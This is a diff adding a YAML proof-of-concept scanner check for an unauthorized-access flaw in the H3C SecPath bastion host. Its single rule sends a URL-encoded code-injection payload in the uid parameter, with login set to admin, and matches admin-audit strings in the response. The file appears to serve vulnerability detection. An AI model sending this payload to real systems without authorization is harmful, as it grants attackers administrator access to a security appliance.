@@ -1,0 +1,16 @@
+name: yaml-poc-h3c-secpath_bastion_host-unauthorized_access-CT-158285
+binding: cc44e733-2b32-4073-a170-8b42922b5f5d
+detail:
+    author: system_user
+    vulnerability:
+        id: 365b66a1-0636-4b7f-9153-0c3c1786fddb
+        level: high
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
+        expression: response.status == 200 && response.body_string.contains("错误的id") && response.body_string.contains("审计管理员") && response.body.bcontains(b"admin")
+expression: r0()
